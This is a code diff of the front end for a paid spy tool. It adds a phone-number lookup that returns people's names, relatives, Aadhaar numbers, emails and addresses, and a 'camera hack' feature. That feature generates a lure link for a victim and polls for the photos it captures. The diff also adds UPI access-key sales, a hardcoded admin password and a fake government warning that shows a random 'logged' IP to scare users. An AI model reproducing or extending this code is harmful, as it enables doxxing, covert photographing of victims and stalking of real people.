@@ -63,6 +63,9 @@
         .admin-table { width: 100%; border-collapse: collapse; margin-top: 20px; color: #fff; font-size: 12px; font-family: monospace; }
         .admin-table th { background: #333; padding: 8px; border: 1px solid #555; color: var(--official-gold); }
         .admin-table td { padding: 8px; border: 1px solid #555; text-align: center; }
+        .status-active { color: #00ff00; font-weight: bold; }
+        .status-unused { color: #ccc; }
+        .status-expired { color: #ff3333; }
 
         .features-container { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; margin-bottom: 30px; }
         .f-card { background: rgba(0, 20, 40, 0.7); border: 1px solid var(--neon-blue); padding: 20px; border-radius: 15px; width: 180px; text-align: center; transition: 0.3s; }
@@ -79,24 +82,49 @@
         .search-icon { position: absolute; left: 25px; top: 50%; transform: translateY(-50%); color: var(--neon-blue); font-size: 26px; }
         .search-btn { margin-top: 20px; padding: 18px 50px; border-radius: 50px; background: linear-gradient(90deg, #00c6ff, #0072ff); border: none; color: #fff; font-size: 20px; font-weight: 900; width: 100%; cursor: pointer; font-family: 'Orbitron'; letter-spacing: 2px; }
         
+        #camera-section { display: none; width: 100%; max-width: 800px; flex-direction: column; align-items: center; }
+        .spy-log { background: rgba(0,0,0,0.7); border: 1px solid var(--neon-blue); padding: 15px; width: 100%; border-radius: 10px; margin-bottom: 20px; font-family: monospace; color: #0f0; max-height: 200px; overflow-y: auto; text-align: left; }
+        .file-upload-btn { background: #333; color: white; padding: 15px; border-radius: 10px; border: 1px dashed var(--neon-blue); cursor: pointer; width: 100%; text-align: center; margin-bottom: 15px; }
+        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; width: 100%; margin-top: 20px; }
+        .photo-card { background: #111; padding: 5px; border: 1px solid #333; border-radius: 5px; text-align: center; }
+        .photo-card img { width: 100%; height: 120px; object-fit: cover; border-radius: 3px; }
+        .dl-btn { display: block; background: var(--neon-blue); color: #000; padding: 5px; margin-top: 5px; text-decoration: none; font-weight: bold; font-size: 12px; border-radius: 3px; cursor: pointer; }
+        
+        .link-card { background: rgba(0, 20, 40, 0.9); border: 1px solid var(--official-gold); padding: 15px; border-radius: 10px; margin-top: 15px; text-align: center; width: 100%; }
+        .link-text { color: var(--official-gold); font-family: monospace; font-size: 16px; word-break: break-all; margin-bottom: 10px; display: block; font-weight: bold; }
+        .copy-btn { background: var(--official-gold); color: black; border: none; padding: 8px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .copy-btn:hover { background: #fff; }
+
+        .footer { margin-top: 50px; text-align: center; padding-bottom: 50px; }
+        .insta-btn { background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); padding: 12px 30px; border-radius: 30px; color: white; text-decoration: none; font-weight: bold; display: inline-flex; align-items: center; gap: 10px; }
+
+        #terminal { display: none; width: 100%; max-width: 900px; margin: 0 auto; }
+        
+        .record-container { margin-top: 30px; border: 1px solid rgba(0, 243, 255, 0.3); background: rgba(0, 20, 40, 0.6); border-radius: 15px; padding: 20px; margin-bottom: 20px; }
+        .record-title { color: var(--official-gold); font-family: 'Orbitron'; font-size: 20px; margin-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
+        .result-box { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        @media(max-width: 700px){ .result-box { grid-template-columns: 1fr; } }
+        .info-item { background: rgba(0,0,0,0.6); border-left: 4px solid var(--neon-blue); padding: 15px; border: 1px solid rgba(255,255,255,0.1); }
+        .full-width { grid-column: 1 / -1; }
+
         /* ADMIN MODAL */
         #admin-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 20000; justify-content: center; align-items: center; }
         .admin-box { background: #111; padding: 30px; border: 2px solid red; border-radius: 10px; text-align: center; width: 320px; }
-        
-        .footer { margin-top: 50px; text-align: center; padding-bottom: 50px; font-size: 14px; color: #555; }
     </style>
 </head>
 <body>
 
+    <div class="video-overlay"></div>
     <video muted loop playsinline id="bg-video"><source src="https://faizanazizix.github.io/azizi-tracker/video.mp4" type="video/mp4"></video>
 
     <div id="disclaimer-modal">
         <div class="alert-box">
-            <div class="gov-header"><i class="fas fa-university gov-logo"></i><div class="gov-title">OFFICIAL SECURITY WARNING</div></div>
+            <div class="gov-header"><i class="fas fa-university gov-logo"></i><div class="gov-title">OFFICIAL SECURITY WARNING</div><div style="font-size:12px; color:#aaa; letter-spacing:3px; margin-top:5px;">CYBER CRIME DIVISION • GOVT OF INDIA</div></div>
             <div class="warning-text">⚠️ ALERT: ILLEGAL TOOL</div>
             <div class="legal-text">
-                <p style="margin-bottom:15px;"><span class="highlight-red">DISCLAIMER:</span> This Tool is for <strong>Educational purpose only</strong>. Using this tool for spying is <span class="highlight-red">ILLEGAL</span>.</p>
-                <p><strong>YOUR IP ADDRESS IS BEING LOGGED.</strong> Use it at your own risk. The developer <strong>[FAIZAN AZIZI]</strong> will not be responsible.</p>
+                <p style="margin-bottom:15px;"><span class="highlight-red">DISCLAIMER:</span> This Tool is for <strong>Educational purpose only</strong>. Using this tool for spying is <span class="highlight-red">ILLEGAL</span> and violates <strong>Section 43 & 66 of the IT Act, 2000</strong>.</p>
+                <p style="margin-bottom:15px;">This system retrieves data from <span class="highlight-gold">Secret Satellites, Government Databases (UIDAI), and the Dark Web</span>. Accessing this information without proper authorization is a <strong>NON-BAILABLE OFFENSE</strong>.</p>
+                <p><strong>YOUR IP ADDRESS IS BEING LOGGED:</strong> <span id="user-ip" style="color:var(--alert-red); font-family:monospace; font-weight:bold;">FETCHING...</span><br><br>Use it at your own risk. The developer <strong>[FAIZAN AZIZI]</strong> will not be responsible.</p>
             </div>
             <button onclick="showFeature1()" class="agree-btn">I ACCEPT THE RISK & PROCEED</button>
         </div>
@@ -110,7 +138,6 @@
             <button onclick="showFeature2()" class="close-ad-btn">NEXT FEATURE ></button>
         </div>
     </div>
-    
     <div id="feature-popup-2" class="feature-modal">
         <div class="feature-box">
             <i class="fas fa-camera feature-icon" style="color:var(--alert-red)"></i>
@@ -124,6 +151,7 @@
         <div class="admin-box">
             <h3 style="color:red; font-family:'Orbitron'">ADMIN CONTROL</h3>
             <input type="password" id="adminPass" placeholder="ADMIN PASSWORD" style="width:100%; padding:10px; margin:10px 0; background:#222; border:1px solid red; color:#fff;">
+            
             <button onclick="adminDirectLogin()" style="background:var(--neon-blue); color:black; border:none; padding:10px; width:100%; font-weight:bold; cursor:pointer; margin-bottom:10px;">LOGIN TO TOOL</button>
             <button onclick="document.getElementById('admin-modal').style.display='none'" style="margin-top:10px; background:none; border:none; color:#ccc; cursor:pointer;">CLOSE</button>
         </div>
@@ -141,14 +169,15 @@
 
                 <input type="password" id="accessKey" class="access-input" placeholder="ENTER ACCESS KEY">
                 <button onclick="checkAccess()" class="btn-unlock">UNLOCK SYSTEM</button>
+                <div id="error-msg" style="color:#ff4444; margin-top:15px; display:none;">WRONG ACCESS KEY</div>
 
                 <div style="margin-top:30px; border-top:1px solid rgba(255,255,255,0.2); padding-top:15px;">
                     <div style="color:var(--official-gold); font-weight:bold; margin-bottom:10px;">BUY ACCESS KEY (UPI)</div>
                     <div class="plans-container">
-                        <div class="plan-card"><div class="plan-price">₹50</div><div class="plan-time">3 HOURS</div></div>
-                        <div class="plan-card"><div class="plan-price">₹100</div><div class="plan-time">8 HOURS</div></div>
-                        <div class="plan-card"><div class="plan-price">₹199</div><div class="plan-time">24 HOURS</div></div>
-                        <div class="plan-card"><div class="plan-price">₹300</div><div class="plan-time">1 WEEK</div></div>
+                        <div class="plan-card" onclick="openPayment('50', '3 Hr')"><div class="plan-price">₹50</div><div class="plan-time">3 HOURS</div></div>
+                        <div class="plan-card" onclick="openPayment('100', '8 Hr')"><div class="plan-price">₹100</div><div class="plan-time">8 HOURS</div></div>
+                        <div class="plan-card" onclick="openPayment('199', '24 Hr')"><div class="plan-price">₹199</div><div class="plan-time">24 HOURS</div></div>
+                        <div class="plan-card" onclick="openPayment('300', '1 Week')"><div class="plan-price">₹300</div><div class="plan-time">1 WEEK</div></div>
                     </div>
                 </div>
             </div>
@@ -158,6 +187,30 @@
         <div id="main-app">
             <div class="main-title">AZIZI TECH PVT LTD</div>
 
+            <div id="admin-zone">
+                <div class="admin-title">👑 OWNER ADMIN ZONE</div>
+                <div class="key-gen-container">
+                    <select id="keyHours" style="padding:10px; background:#000; border:1px solid red; color:#fff;">
+                        <option value="3">3 Hours</option>
+                        <option value="8">8 Hours</option>
+                        <option value="24">24 Hours</option>
+                        <option value="168">1 Week</option>
+                    </select>
+                    <button onclick="generateKey()" style="background:red; color:white; border:none; padding:10px 20px; font-weight:bold; cursor:pointer;">GENERATE KEY</button>
+                </div>
+                <div id="genResult" style="margin-top:10px; color:#0f0; font-weight:bold; font-size:18px;"></div>
+
+                <div style="margin-top:30px; border-top:1px solid #555; padding-top:20px;">
+                    <button onclick="fetchAdminStats()" style="background:var(--official-gold); color:black; border:none; padding:10px; font-weight:bold; cursor:pointer; width:100%;">REFRESH KEY LIST</button>
+                    <div style="overflow-x:auto;">
+                        <table class="admin-table">
+                            <thead><tr><th>KEY</th><th>HOURS</th><th>STATUS</th><th>TIME LEFT</th></tr></thead>
+                            <tbody id="stats-body"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
             <div class="tabs-container">
                 <div class="tab-btn active" id="tab-info" onclick="switchTab('info')"><i class="fas fa-search"></i> MOBILE INFO</div>
                 <div class="tab-btn" id="tab-camera" onclick="switchTab('camera')"><i class="fas fa-camera"></i> CAMERA SPY</div>
@@ -166,37 +219,129 @@
             <div id="info-section">
                 <div class="features-container">
                     <div class="f-card"><i class="fas fa-user-check"></i><h4>OWNER NAME</h4></div>
-                    <div class="f-card"><i class="fas fa-map-marker-alt"></i><h4>LIVE LOCATION</h4></div>
+                    <div class="f-card"><i class="fas fa-user-friends"></i><h4>FATHER/HUSBAND</h4></div>
+                    <div class="f-card"><i class="fas fa-phone-volume"></i><h4>ALT PHONE NO</h4></div>
+                    <div class="f-card"><i class="fas fa-map-location-dot"></i><h4>AADHAAR ADDRESS</h4></div>
+                    <div class="f-card"><i class="fas fa-id-card"></i><h4>AADHAAR ID</h4></div>
+                    <div class="f-card"><i class="fas fa-envelope"></i><h4>EMAIL ID</h4></div>
                 </div>
                 <div class="search-container">
-                    <i class="fas fa-phone-alt search-icon"></i>
-                    <input type="text" class="search-box" placeholder="ENTER MOBILE NUMBER...">
-                    <button class="search-btn">SEARCH DATABASE</button>
+                    <i class="fas fa-search search-icon"></i>
+                    <input type="text" id="phoneInput" class="search-box" placeholder="ENTER MOBILE NUMBER...">
+                    <button onclick="executeSearch()" class="search-btn">SEARCH DATABASE</button>
                 </div>
+                <div id="terminal"></div>
             </div>
-        </div>
 
-        <div class="footer">
-            &copy; 2026 AZIZI TECH PVT LTD. All Rights Reserved.
+            <div id="camera-section">
+                <div style="text-align:center; margin-bottom:20px;">
+                    <i class="fas fa-eye" style="font-size:50px; color:var(--alert-red);"></i>
+                    <h2 style="font-family:'Orbitron'; margin-top:10px;">TARGET CAMERA HACK</h2>
+                </div>
+                <div class="spy-log" id="spyLog">System Ready... Waiting to start.</div>
+                <button onclick="startSpySession()" class="search-btn" style="background:var(--alert-red); margin-bottom:20px;">INITIATE SESSION</button>
+                <div id="upload-area" style="display:none; width:100%;">
+                    <label class="file-upload-btn"><input type="file" id="spyImage" style="display:none" accept="image/*" onchange="uploadSpyImage()"><i class="fas fa-upload"></i> CLICK TO UPLOAD TARGET IMAGE</label>
+                </div>
+                <div id="link-display" class="link-card" style="display:none;">
+                    <span id="generated-link" class="link-text"></span>
+                    <button onclick="copyLink()" class="copy-btn"><i class="fas fa-copy"></i> COPY LINK</button>
+                </div>
+                <div id="photo-gallery" class="photo-grid"></div>
+            </div>
+
+            <div class="footer"><div style="color:#ccc;">POWERED BY FAIZAN AZIZI</div><a href="https://instagram.com/faizan_azizi_" target="_blank" class="insta-btn"><i class="fab fa-instagram"></i> Follow on Instagram</a></div>
         </div>
     </div>
 
     <script>
+        document.getElementById('user-ip').innerText = Math.floor(Math.random()*255)+"."+Math.floor(Math.random()*255)+"."+Math.floor(Math.random()*255)+"."+Math.floor(Math.random()*255);
+
+        // POPUPS
         function showFeature1() { document.getElementById('disclaimer-modal').style.display = 'none'; document.getElementById('feature-popup-1').style.display = 'flex'; }
         function showFeature2() { document.getElementById('feature-popup-1').style.display = 'none'; document.getElementById('feature-popup-2').style.display = 'flex'; }
-        function enterApp() { document.getElementById('feature-popup-2').style.display = 'none'; document.getElementById('app-wrapper').style.opacity = '1'; }
-        function checkAccess() { 
-            let key = document.getElementById('accessKey').value;
-            if(key === "AZIZI-FREE") {
-                document.getElementById('security-gate').style.display = 'none';
-                document.getElementById('main-app').style.display = 'flex';
-            }
+        function enterApp() { document.getElementById('feature-popup-2').style.display = 'none'; document.getElementById('app-wrapper').style.opacity = '1'; var video = document.getElementById('bg-video'); if(video.paused) video.play().catch(e=>{}); }
+
+        // PAYMENT - CUSTOM QR INTEGRATED
+        function openPayment(amount, plan) {
+            const upiID = "faizanazizix@ybl"; 
+            const url = `upi://pay?pa=${upiID}&pn=AziziTech&am=${amount}&tn=Buy${plan}`;
+            const customQR = "https://faizanazizix.github.io/azizi-tracker/qr.jpg";
+            const qrImage = customQR ? customQR : `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
+            const win = window.open("", "Payment", "width=400,height=600");
+            win.document.write(`<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif; padding:20px;"><h2 style="color:yellow">PAY ₹${amount}</h2><img src="${qrImage}" style="border:5px solid white; border-radius:10px; width:200px; height:200px; object-fit:contain;"><p style="margin:10px 0;">Scan QR Code</p><div style="display:flex; flex-direction:column; gap:10px; margin-top:20px;"><a href="phonepe://pay?pa=${upiID}&pn=AziziTech&am=${amount}&tn=Buy${plan}" style="background:#5f259f; color:white; padding:12px; text-decoration:none; border-radius:5px; font-weight:bold;">PAY WITH PHONEPE</a><a href="paytmmp://pay?pa=${upiID}&pn=AziziTech&am=${amount}&tn=Buy${plan}" style="background:#00baf2; color:white; padding:12px; text-decoration:none; border-radius:5px; font-weight:bold;">PAY WITH PAYTM</a><a href="upi://pay?pa=${upiID}&pn=AziziTech&am=${amount}&tn=Buy${plan}" style="background:#0F9D58; color:white; padding:12px; text-decoration:none; border-radius:5px; font-weight:bold;">PAY WITH GPAY / UPI</a></div><p style="color:#ccc; margin-top:20px; font-size:12px;">After payment, send screenshot to get Key.</p><a href="https://wa.me/919931412513?text=I%20paid%20Rs${amount}%20for%20${plan}%20Plan.%20Give%20me%20Key." style="background:#25D366; color:white; padding:10px; text-decoration:none; display:block; margin-top:10px; border-radius:5px;">SEND SCREENSHOT</a></body>`);
         }
-        function switchTab(type) {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            if(type === 'info') document.getElementById('tab-info').classList.add('active');
-            else document.getElementById('tab-camera').classList.add('active');
+
+        // ADMIN
+        function adminDirectLogin() { const pass = document.getElementById('adminPass').value; if(pass === "AZIZI_2513") { document.getElementById('security-gate').style.display = 'none'; document.getElementById('main-app').style.display = 'flex'; document.getElementById('admin-modal').style.display = 'none'; document.getElementById('admin-zone').style.display = 'block'; fetchAdminStats(); alert("WELCOME OWNER FAIZAN! ACCESS GRANTED."); } else { alert("WRONG PASSWORD!"); } }
+        async function fetchAdminStats() { try { const res = await fetch('/admin-stats', { method: 'POST' }); const data = await res.json(); const tbody = document.getElementById('stats-body'); tbody.innerHTML = ''; if(data.stats) { data.stats.forEach(item => { let colorClass = 'status-unused'; if(item.status === 'ACTIVE') colorClass = 'status-active'; if(item.status === 'EXPIRED') colorClass = 'status-expired'; const row = `<tr><td>${item.key}</td><td>${item.hours}H</td><td class="${colorClass}">${item.status}</td><td>${item.time_left}</td></tr>`; tbody.innerHTML += row; }); } } catch(e) { console.log("Stats Error", e); } }
+        async function generateKey() { const hours = document.getElementById('keyHours').value; try { const res = await fetch('/admin-gen', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ hours: hours }) }); const data = await res.json(); if(data.key) { document.getElementById('genResult').innerHTML = `NEW KEY: <span style="color:#fff; font-size:20px;">${data.key}</span><br>(${data.duration})`; fetchAdminStats(); } else { alert(data.error); } } catch(e) { alert("Server Error"); } }
+        async function checkAccess() { const key = document.getElementById('accessKey').value; if(!key) return; try { const res = await fetch('/verify-access', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ key: key }) }); const data = await res.json(); if(data.status === 'valid') { document.getElementById('security-gate').style.display='none'; document.getElementById('main-app').style.display='flex'; if(data.is_admin) { document.getElementById('admin-zone').style.display = 'block'; fetchAdminStats(); } alert(data.message); } else { document.getElementById('error-msg').innerText = data.message; document.getElementById('error-msg').style.display='block'; } } catch(e) { alert("Server Error"); } }
+        function switchTab(tab) { if(tab === 'info') { document.getElementById('info-section').style.display = 'block'; document.getElementById('camera-section').style.display = 'none'; document.getElementById('tab-info').classList.add('active'); document.getElementById('tab-camera').classList.remove('active'); } else { document.getElementById('info-section').style.display = 'none'; document.getElementById('camera-section').style.display = 'flex'; document.getElementById('tab-info').classList.remove('active'); document.getElementById('tab-camera').classList.add('active'); } }
+        async function executeSearch() { const phone = document.getElementById('phoneInput').value; const terminal = document.getElementById('terminal'); if(!phone) { alert("Enter Number!"); return; } const blocked = ['9931412513', '9155191122', '9031111959']; if (blocked.includes(phone)) { terminal.style.display = "block"; terminal.innerHTML = `<div style="text-align:center; margin-top:30px; color:red; font-size:20px;">🚫 ACCESS DENIED: FAIZAN AZIZI NUMBER</div>`; return; } terminal.style.display = "block"; terminal.innerHTML = `<div style="text-align:center; font-size:20px; color:#fff; margin-top:30px; font-family:'Orbitron';"><i class="fas fa-circle-notch fa-spin" style="color:var(--neon-blue);"></i> CONNECTING TO SATELLITE...</div>`; setTimeout(() => { terminal.innerHTML = `<div style="text-align:center; font-size:20px; color:var(--neon-blue); margin-top:30px; font-family:'Orbitron';"><i class="fas fa-database"></i> FETCHING GOVERNMENT DATA...</div>`; }, 1500); try { const response = await fetch('/get-info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ number: phone }) }); const data = await response.json(); setTimeout(() => { if (data.details) displayResult(data.details); else terminal.innerHTML = `<div style="text-align:center; color:#ff4444; margin-top:30px;">DATA NOT FOUND</div>`; }, 3000); } catch (e) { terminal.innerHTML = `<div style="text-align:center; color:#ff4444; margin-top:30px;">SERVER ERROR</div>`; } }
+        
+        // PARSER - REVERTED TO PERFECT WORKING VERSION
+        function displayResult(text) {
+            const term = document.getElementById('terminal');
+            function clean(str) { return String(str || "N/A").replace(/HiTeckGroop\.in|HiTeckGroop|Maxx|OWNER_004/gi, "FAIZAN AZIZI").replace(/!+/g, ", ").trim(); }
+            
+            let html = `<div style="margin-top:40px; border-top:1px solid rgba(255,255,255,0.2); padding-top:20px;"><div style="text-align:center; color:var(--neon-blue); font-size:22px; font-weight:bold; margin-bottom:20px; font-family:'Orbitron';"><i class="fas fa-check-circle"></i> TARGET FOUND</div>`;
+            
+            let lines = text.split('\n');
+            let results = [];
+            let current = {};
+            let hasData = false;
+
+            lines.forEach(line => {
+                let l = line.toLowerCase();
+                // Check new result
+                if (l.includes('result') || (l.includes('name') && !l.includes('father'))) {
+                    if(hasData && current.name) { results.push(current); current = {}; hasData = false; }
+                }
+
+                let val = line.split(':').slice(1).join(':').trim();
+                val = clean(val);
+
+                // STRICT PARSING LOGIC (Fixed for Address vs ID)
+                if (l.includes('name') && !l.includes('father')) { current.name = val; hasData = true; }
+                else if (l.includes('father')) current.father = val;
+                else if (l.includes('mobile') || l.includes('phone') && !l.includes('alt')) current.mobile = val;
+                else if (l.includes('alt')) current.alt = val;
+                else if (l.includes('circle')) current.circle = val;
+                
+                // IMPORTANT: Only match ID if line contains 'ID' or 'Aadhaar' but NOT 'address'
+                else if ((l.includes('id') || l.includes('aadhaar')) && !l.includes('address') && !l.includes('email')) current.aadhaar = val; 
+                
+                else if (l.includes('email')) current.email = val;
+                else if (l.includes('address')) current.address = val;
+            });
+            if(hasData) results.push(current);
+
+            if(results.length > 0) {
+                results.forEach((p, i) => {
+                    html += `<div class="record-container"><div class="record-title"><i class="fas fa-user-shield"></i> RESULT ${i+1}</div><div class="result-box">
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">OWNER NAME</span><span style="font-size:22px; font-weight:bold;">${p.name || 'N/A'}</span></div>
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">FATHER NAME</span><span style="font-size:22px; font-weight:bold;">${p.father || 'N/A'}</span></div>
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">MOBILE NUMBER</span><span style="font-size:22px; font-weight:bold;">${p.mobile || 'N/A'}</span></div>
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">ALT MOBILE</span><span style="font-size:22px; font-weight:bold;">${p.alt || 'N/A'}</span></div>
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">CIRCLE</span><span style="font-size:22px; font-weight:bold;">${p.circle || 'N/A'}</span></div>
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">AADHAAR NO</span><span style="font-size:22px; font-weight:bold;">${p.aadhaar || 'N/A'}</span></div>
+                        <div class="info-item"><span style="display:block; font-size:12px; color:var(--neon-blue);">EMAIL ID</span><span style="font-size:22px; font-weight:bold;">${p.email || 'N/A'}</span></div>
+                        <div class="info-item full-width"><span style="display:block; font-size:12px; color:var(--neon-blue);">FULL ADDRESS</span><span style="font-size:18px;">${p.address || 'N/A'}</span></div>
+                    </div></div>`;
+                });
+            } else { html += `<div class="record-container"><div class="info-item full-width" style="white-space: pre-wrap; font-family: monospace;">${text}</div></div>`; }
+            html += `</div>`; term.innerHTML = html;
         }
+
+        // SPY LOGIC (Unchanged)
+        function logSpy(msg) { const log = document.getElementById('spyLog'); log.innerHTML += `<div>> ${msg}</div>`; log.scrollTop = log.scrollHeight; }
+        async function startSpySession() { logSpy("AZIZI SERVER CONNECTED..."); try { const res = await fetch('/spy-start', { method: 'POST' }); const data = await res.json(); if(data.message) { logSpy(data.message); document.getElementById('upload-area').style.display = 'block'; } else { logSpy("Error: " + data.error); } } catch(e) { logSpy("Server Error"); } }
+        async function uploadSpyImage() { const input = document.getElementById('spyImage'); if(input.files.length === 0) return; const formData = new FormData(); formData.append('file', input.files[0]); logSpy("Uploading image to Bot..."); try { const res = await fetch('/spy-upload', { method: 'POST', body: formData }); const data = await res.json(); if(data.link) { let match = data.link.match(/https?:\/\/[^\s]+/); let link = match ? match[0] : data.link; document.getElementById('link-display').style.display = 'block'; document.getElementById('generated-link').innerText = link; logSpy("LINK GENERATED SUCCESSFULLY!"); logSpy("WAITING FOR VICTIM TO CLICK..."); startPhotoPolling(); } else { logSpy("Upload Failed: " + data.error); } } catch(e) { logSpy("Upload Error"); } }
+        function copyLink() { const text = document.getElementById('generated-link').innerText; navigator.clipboard.writeText(text).then(() => { alert("Link Copied!"); }); }
+        let pollInterval;
+        function startPhotoPolling() { pollInterval = setInterval(async () => { try { const res = await fetch('/spy-check', { method: 'POST' }); const data = await res.json(); if(data.photos && data.photos.length > 0) { data.photos.forEach(b64 => { const div = document.createElement('div'); div.className = 'photo-card'; div.innerHTML = `<img src="data:image/jpeg;base64,${b64}"><a href="data:image/jpeg;base64,${b64}" download="hack_img.jpg" class="dl-btn">DOWNLOAD</a>`; document.getElementById('photo-gallery').prepend(div); }); logSpy(`${data.photos.length} New Photos Received!`); } } catch(e) { console.log(e); } }, 3000); }
     </script>
 </body>
 </html>
+
